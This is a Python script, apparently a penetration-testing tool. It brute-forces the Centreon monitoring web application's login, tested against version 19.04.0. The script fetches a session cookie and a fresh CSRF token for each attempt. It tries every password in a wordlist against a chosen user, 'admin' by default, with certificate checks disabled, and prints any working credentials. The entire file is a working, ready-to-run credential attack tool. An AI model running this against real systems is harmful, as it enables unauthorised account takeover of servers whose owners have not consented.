#!/usr/bin/python3
#Centreon Webapp Bruteforcer -- tested against version 19.04.0
#AG | MuirlandOracle
#11/20


import requests, argparse, os, sys, signal
from urllib3.exceptions import InsecureRequestWarning

#### Ignore certs ####
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#### Signal Handler ####
def sigHandle(sig, frame):
	print("\033[34m\nExiting....\033[0m")
	sys.exit(0)



class Exploit():
	def __init__(self):
		self.sess = requests.session()
		self.sess.verify=False
		self.sess.timeout=5


	#### Colours #### 
	class colours():
		red = "\033[91m"
		green = "\033[92m"
		blue = "\033[34m"
		orange = "\033[33m"
		purple = "\033[35m"
		end = "\033[0m"
	
	def success(self, message):
		if not self.args.accessible:
			print(f"{self.colours.green}[+] {message}{self.colours.end}")
		else:
			print(f"Success: {message}")

	
	def warn(self, message):
		if not self.args.accessible:
			print(f"{self.colours.orange}[*] {message}{self.colours.end}")
		else:
			print(f"Warning: {message}")


	def info(self, message):
		if not self.args.accessible:
			print(f"{self.colours.blue}[*] {message}{self.colours.end}")
		else:
			print(f"Info: {message}")

	def fail(self, message, die=True):
		if not self.args.accessible:
			print(f"{self.colours.red}[-] {message}{self.colours.end}")
		else:
			print(f"Failure: {message}")

		if die:
			sys.exit(0)

	banner = (f"""{colours.orange}


		  ____           _                        
		 / ___|___ _ __ | |_ _ __ ___  ___  _ __  
		| |   / _ \ '_ \| __| '__/ _ \/ _ \| '_ \ 
		| |__|  __/ | | | |_| | |  __/ (_) | | | |
		 \____\___|_| |_|\__|_|  \___|\___/|_| |_|                                      
		 ____             _        __                    
		| __ ) _ __ _   _| |_ ___ / _| ___  _ __ ___ ___ 
		|  _ \\| \'__| | | | __/ _ \\ |_ / _ \| \'__/ __/ _ \\
		| |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/
		|____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|
                                                 

							{colours.purple}@MuirlandOracle{colours.end}


	""")

	def parseArgs(self):
		parser = argparse.ArgumentParser(description="Centreon Bruteforcer")
		parser.add_argument("target", help="The url to target")
		parser.add_argument("wordlist", help="Path to wordlist")
		parser.add_argument("-P", "--port", type=int, help="Specify a custom port (defaults to 80 for HTTP or 443 for HTTPS)")
		parser.add_argument("-s", "--ssl", default="http://", const="https://", action="store_const", help="SSL?")
		parser.add_argument("-q", "--quiet", default=False, action="store_true", help="Don't display all attempted combinations")
		parser.add_argument("-u", "--username", default="admin", help="Username to bruteforce with (default admin)")
		parser.add_argument("--accessible", default=False, action="store_true", help="Accessibility mode?")
		self.args = parser.parse_args()
	
		if not os.path.isfile(self.args.wordlist):
			self.fail("Invalid Wordlist")

		with open(self.args.wordlist, encoding="utf-8") as data:
			self.words = [i.strip("\n") for i in data.readlines()]

		if not self.args.port:
			if "https" in self.args.ssl:
				self.args.port = 443
			else:
				self.args.port = 80
		elif self.args.port not in range(1,65535):
			self.fail(f"Invalid Port: {self.args.port}")


		self.target = f"{self.args.ssl}{self.args.target}:{self.args.port}/centreon/index.php"


	def getSessID(self):
		try:
			r = self.sess.get(url=self.target)
		except:
			self.fail(f"Couldn't connect to target ({self.target})")
		try:
			self.sessid = r.headers["Set-Cookie"].split("PHPSESSID=")[1].split(";")[0]
		except:
			self.fail(f"Couldn't retrieve PHPSESSID -- are you sure this is Centreon?")


	def getToken(self):
		try:
			r = self.sess.get(url=self.target)
		except:
			self.fail(f"Couldn't connect to target ({self.target})")
		try:
			return (r.text.split("value=")[2].split(" ")[0].strip('"'))
		except:
			self.fail(f"Couldn't retrieve token -- are you sure this is Centreon?")

	def makeRequest(self, token, password):
		data = {
			"useralias":self.args.username,
			"password":password,
			"submitLogin":"Connect",
			"centreon_token":token
		}
		cookie = {
			"PHPSESSID":self.sessid
		}
		
		headers = {
			"Referer":self.target
		}
		r = self.sess.post(url=self.target, data=data, cookies=cookie, headers=headers)
		if "Your credentials are incorrect." not in r.text:
			self.success(f"Got credentials! {self.args.username}:{password}\n\n")
			sys.exit(0)
		elif not self.args.quiet:
			self.fail(f"Login failed with {self.args.username}:{password}", False)


	def attack(self):
		for i in self.words:
			self.makeRequest(self.getToken(), i)


if __name__ == "__main__":
	signal.signal(signal.SIGINT, sigHandle)
	exploit = Exploit()
	exploit.parseArgs()
	if not exploit.args.accessible:
		print(exploit.banner)
	else:
		print("Centreon Bruteforcer: Coded by @MuirlandOracle")
	exploit.getSessID()
	exploit.attack()
